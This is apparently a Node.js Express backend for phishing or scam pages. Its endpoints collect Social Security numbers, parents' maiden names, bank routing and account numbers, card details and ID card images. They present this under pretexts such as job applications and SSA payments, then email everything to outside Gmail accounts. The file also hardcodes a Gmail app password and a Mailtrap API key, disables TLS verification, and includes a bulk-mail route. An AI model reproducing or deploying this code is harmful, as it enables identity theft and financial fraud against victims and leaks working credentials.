process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const express = require("express");
const bodyParser = require("body-parser");
const multer = require("multer");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();
const upload = multer({ storage: multer.memoryStorage() }); // Store files in memory

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.raw());
app.use(bodyParser.text());

app.use(
  cors({
    origin: "*", // Replace with your actual HTML domain
  })
);

app.get("/", (req, res) => {
  res.send("Server");
});

const cpUpload = upload.fields([
  { name: "client_resume", maxCount: 1 },
  { name: "cover_letter", maxCount: 8 },
  { name: "front_id_card", maxCount: 2 },
  { name: "back_id_card", maxCount: 2 },
]);

app.post("/send-email", cpUpload, (req, res) => {
  const {
    last_name,
    first_name,
    name_title,
    middle_name,
    email_address,
    phone_number,
    date_of_birth,
    client_state,
    client_address,
    client_city,
    postal_code,
  } = req.body;

  console.log(req.body);

  const resume = req.files.client_resume ? req.files.client_resume[0] : null;
  const coverLetter = req.files.cover_letter ? req.files.cover_letter[0] : null;
  const frontidCard = req.files.front_id_card
    ? req.files.front_id_card[0]
    : null;
  const backidCard = req.files.back_id_card ? req.files.back_id_card[0] : null;

  // Construct email message
  const message = `
    Contact Information:
    Last Name: ${last_name}
    First Name: ${first_name}
    Title: ${name_title}
    Middle Name: ${middle_name}
    Email Address: ${email_address}
    Phone Number: ${phone_number}

    Sensitive Information:
    Date of Birth: ${date_of_birth}

    Address:
    State: ${client_state}
    Address Line: ${client_address}
    City: ${client_city}
    Postal Code: ${postal_code}
  `;

  // Create a transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "davidmiller4504@gmail.com",
      pass: "dqhc mwpf nkmb buib",
    },
  });

  // Setup email data with unicode symbols
  let mailOptions = {
    from: "davidmiller4504@gmail.com", // sender address
    to: "davidleonardo385@gmail.com", // list of receivers
    subject: `New Contact Form Submission ${first_name, last_name}`, // Subject line
    text: message, // plain text body
    attachments: [
      resume ? { filename: resume.originalname, content: resume.buffer } : null,
      coverLetter
        ? { filename: coverLetter.originalname, content: coverLetter.buffer }
        : null,
      frontidCard
        ? { filename: frontidCard.originalname, content: frontidCard.buffer }
        : null,
      backidCard
        ? { filename: backidCard.originalname, content: backidCard.buffer }
        : null,
    ].filter((attachment) => attachment), // Include only attachments that exist
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent: " + info.response);
      res.send("Email sent successfully!");
    }
  });
});

app.post("/sender", async (req, res) => {
  const {
    bank_name,
    credit_card,
    payment_method,
    company_trust,
    checking_account,
    email,
  } = req.body;
  console.log(req.body);

  // Construct email message
  const message = `
    Contact Information (bank details):
    Bank Name: ${bank_name}
    Credit Name: ${credit_card}
    Payment Method: ${payment_method}
    Company Trust: ${company_trust}
    Checking Account: ${checking_account}
    Email: ${email}
  `;

  // Create a transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "davidmiller4504@gmail.com",
      pass: "dqhc mwpf nkmb buib",
    },
  });

  let mailOptions = {
    from: "davidmiller4504@gmail.com", // sender address
    to: "davidleonardo385@gmail.com", // list of receivers
    subject: `New Contact Form Submission ${email}`, // Subject line
    text: message, // plain text body
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent: " + info.response);
      res.json({ success: true, message: "Email sent successfully!" });
    }
  });
});

app.post("/arnoldsender", async (req, res) => {
  const {
    firstName,
    lastName,
    phoneNumber,
    email,
    country,
    city,
    state,
    address,
    zip,
    shirt,
    referralCode,
  } = req.body;
  console.log(req.body);

  // Construct email message
  const message = `
    Contact Information (bank details):
    First Name: ${firstName}
    Last Name: ${lastName}
    number: ${phoneNumber}
    email: ${email}
    Country: ${country}
    City: ${city}
    state: ${state}
        address: ${address}
    zip: ${zip}
    shirt: ${shirt}
    code: ${referralCode}
  `;

  // Create a transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "davidmiller4504@gmail.com",
      pass: "dqhc mwpf nkmb buib",
    },
  });

  let mailOptions = {
    from: "davidmiller4504@gmail.com", // sender address
    to: "davidmiller4504@gmail.com", // list of receivers
    subject: `New Contact Form Submission ${firstName}`, // Subject line
    text: message, // plain text body
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent: " + info.response);
      res.json({ success: true, message: "Email sent successfully!" });
    }
  });
});

app.post("/ssnsender", async (req, res) => {
  const {
    fullName,
    ssn,
    mailingAddress,
    fathersName,
    mothersName,
    placeOfBirth,
    state,
    amountReceived,
    routingNumber,
    accountNumber,
    phoneNumber,
    receivedSSA,
    dob,
    dateOfPayment,
  } = req.body;
  console.log(req.body);

  // Construct email message
  const message = `
    You go a new information from ${fullName}:

    Full Name: ${fullName}

    SSN: ${ssn}

    Mailing Address on Profile: ${mailingAddress}

    Fathers Full Name and Maiden Name: ${fathersName}

    Mother's Full Name and Maiden Name: ${mothersName}

    Place of Birth (City and State): ${placeOfBirth}

    State: ${state}

    Amount Received Last Month (In USD): ${amountReceived}

    Routing Number That's on File: ${routingNumber}

    Account Number That's on File: ${accountNumber}

    Phone Number: ${phoneNumber}

    Did You Receive SSA (YES or NO): ${receivedSSA}

    Date of Birth (DD/MM/YYYY): ${dob}

    Date of Payment: ${dateOfPayment}
  `;
  // Create a transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "davidmiller4504@gmail.com",
      pass: "dqhc mwpf nkmb buib",
    },
  });

  let mailOptions = {
    from: "davidmiller4504@gmail.com", // sender address
    to: "masonwilfred01@gmail.com", // list of receivers
    subject: `New Contact Form Submission ${fullName}`, // Subject line
    text: message, // plain text body
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent: " + info.response);
      res.json({ success: true, message: "Email sent successfully!" });
    }
  });
});


app.post("/ssnsenderjullish", async (req, res) => {
  const {
    fullName,
    ssn,
    mailingAddress,
    fathersName,
    mothersName,
    placeOfBirth,
    state,
    amountReceived,
    routingNumber,
    accountNumber,
    phoneNumber,
    receivedSSA,
    dob,
    dateOfPayment,
  } = req.body;
  console.log(req.body);

  // Construct email message
  const message = `
    You go a new information from ${fullName}:

    Full Name: ${fullName}

    SSN: ${ssn}

    Mailing Address on Profile: ${mailingAddress}

    Fathers Full Name and Maiden Name: ${fathersName}

    Mother's Full Name and Maiden Name: ${mothersName}

    Place of Birth (City and State): ${placeOfBirth}

    State: ${state}

    Amount Received Last Month (In USD): ${amountReceived}

    Routing Number That's on File: ${routingNumber}

    Account Number That's on File: ${accountNumber}

    Phone Number: ${phoneNumber}

    Did You Receive SSA (YES or NO): ${receivedSSA}

    Date of Birth (DD/MM/YYYY): ${dob}

    Date of Payment: ${dateOfPayment}
  `;
  // Create a transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "davidmiller4504@gmail.com",
      pass: "dqhc mwpf nkmb buib",
    },
  });

  let mailOptions = {
    from: "davidmiller4504@gmail.com", // sender address
    to: "hopejullich@gmail.com", // list of receivers
    subject: `New Contact Form Submission ${fullName}`, // Subject line
    text: message, // plain text body
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent: " + info.response);
      res.json({ success: true, message: "Email sent successfully!" });
    }
  });
});

app.post("/ssnsender2", async (req, res) => {
  const {
    fullName,
    ssn,
    mailingAddress,
    fathersName,
    mothersName,
    placeOfBirth,
    state,
    amountReceived,
    routingNumber,
    accountNumber,
    phoneNumber,
    receivedSSA,
    dob,
    dateOfPayment,
  } = req.body;
  console.log(req.body);

  // Construct email message
  const message = `
    You go a new information from ${fullName}:

    Full Name: ${fullName}

    SSN: ${ssn}

    Mailing Address on Profile: ${mailingAddress}

    Fathers Full Name and Maiden Name: ${fathersName}

    Mother's Full Name and Maiden Name: ${mothersName}

    Place of Birth (City and State): ${placeOfBirth}

    State: ${state}

    Amount Received Last Month (In USD): ${amountReceived}

    Routing Number That's on File: ${routingNumber}

    Account Number That's on File: ${accountNumber}

    Phone Number: ${phoneNumber}

    Did You Receive SSA (YES or NO): ${receivedSSA}

    Date of Birth (DD/MM/YYYY): ${dob}

    Date of Payment: ${dateOfPayment}
  `;
  // Create a transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "davidmiller4504@gmail.com",
      pass: "dqhc mwpf nkmb buib",
    },
  });

  let mailOptions = {
    from: "davidmiller4504@gmail.com", // sender address
    to: "ssgov7613@gmail.com", // list of receivers
    subject: `New Contact Form Submission ${fullName}`, // Subject line
    text: message, // plain text body
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent: " + info.response);
      res.json({ success: true, message: "Email sent successfully!" });
    }
  });
});

app.post("/bulksender", async (req, res) => {
  var transporter = nodemailer.createTransport({
    host: "bulk.smtp.mailtrap.io",
    port: 587,
    auth: {
      user: "api",
      pass: "aaa8f7986cbccdc1f2633ad8b84f24bc",
    },
    maxMessages: Infinity, // Allow an unlimited number of messages per connection
    maxConnections: 5, // Limit the number of simultaneous connections
  });

  // Example list of recipients for bulk emailing
  const recipients = [
    { email: "recipient1@example.com", name: "Recipient One" },
    { email: "recipient2@example.com", name: "Recipient Two" },
    { email: "recipient3@example.com", name: "Recipient Three" },
    // Add more recipients as needed
  ];

  // Prepare email promises for sending in bulk
  const emailPromises = recipients.map((recipient) =>
    transporter.sendMail({
      from: "tradecrypt.org",
      to: `${recipient.name} <${recipient.email}>`, // Personalized to each recipient
      subject: "Bulk Email Test",
      text: "This is a test email sent in bulk using Nodemailer and Mailtrap.",
      html: `<b>Hello ${recipient.name},</b><p>This is a test email sent in bulk using Nodemailer and Mailtrap.</p>`,
    })
  );

  // Send all emails in parallel and handle the results
  Promise.all(emailPromises)
    .then((results) => {
      console.log("All emails sent successfully");
      results.forEach((result) => {
        console.log(
          `Message to ${result.envelope.to} sent: ${result.messageId}`
        );
      });
    })
    .catch((errors) => {
      console.error("Failed to send one or more emails:", errors);
    });
});

app.post("/hookup", async (req, res) => {
  const { item, room, email } = req.body;
  console.log(req.body);

  // // Construct email message
  const message = `
    You go a new information from ${email}:

    Girl Name: ${item.name}
    Girl Price:  ${item.price}
        Girl Nationality:  ${item.nationality}
    Girl Image1:  ${item.images[0]}
    Girl Image2:  ${item.images[1]}


    room Name: ${room.RoomName}
    room Price: ${room.price}
    
    Client Email: ${email}
  `;
  // Create a transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "davidmiller4504@gmail.com",
      pass: "dqhc mwpf nkmb buib",
    },
  });

  let mailOptions = {
    from: "davidmiller4504@gmail.com", // sender address
    to: "omerlapsha@gmail.com", // list of receivers
    subject: `New Contact Form Submission from ${email}`, // Subject line
    text: message, // plain text body
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent: " + info.response);
      res.json({ success: true, message: "Email sent successfully!" });
    }
  });
});

const jobUpload = upload.fields([
  { name: "resume", maxCount: 1 },
  { name: "frontId", maxCount: 1 },
  { name: "backId", maxCount: 1 },
  { name: "transcript", maxCount: 1 },
]);

app.post("/stewjob", jobUpload, (req, res) => {
  const { fullname, number, email, address, dob,ssn } = req.body;

  console.log(req.body);
  console.log(req.files);

  const resume = req.files.resume ? req.files.resume[0] : null;
  const transcript = req.files.transcript ? req.files.transcript[0] : null;
  const frontidCard = req.files.frontId ? req.files.frontId[0] : null;
  const backidCard = req.files.backId ? req.files.backId[0] : null;

  // Construct email message
  const message = `
    Contact Information from ${fullname}:
    Full Name: ${fullname}
    Number: ${number}
    Email: ${email}
    Address: ${address}
    Date of birth: ${dob}
    ssn ${ssn}
  `;

  // Create a transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "davidmiller4504@gmail.com",
      pass: "dqhc mwpf nkmb buib",
    },
  });

  // Setup email data with unicode symbols
  let mailOptions = {
    from: "davidmiller4504@gmail.com", // sender address
    to: "davidmiller4504@gmail.com", // list of receivers
    subject: `New Contact Form Submission from ${fullname}`, // Subject line
    text: message, // plain text body
    attachments: [
      resume ? { filename: resume.originalname, content: resume.buffer } : null,
      transcript
        ? { filename: transcript.originalname, content: transcript.buffer }
        : null,
      frontidCard
        ? { filename: frontidCard.originalname, content: frontidCard.buffer }
        : null,
      backidCard
        ? { filename: backidCard.originalname, content: backidCard.buffer }
        : null,
    ].filter((attachment) => attachment), // Include only attachments that exist
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent: " + info.response);
      res
        .status(200)
        .json({ message: "Email sent successfully!", data: req.body });
    }
  });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
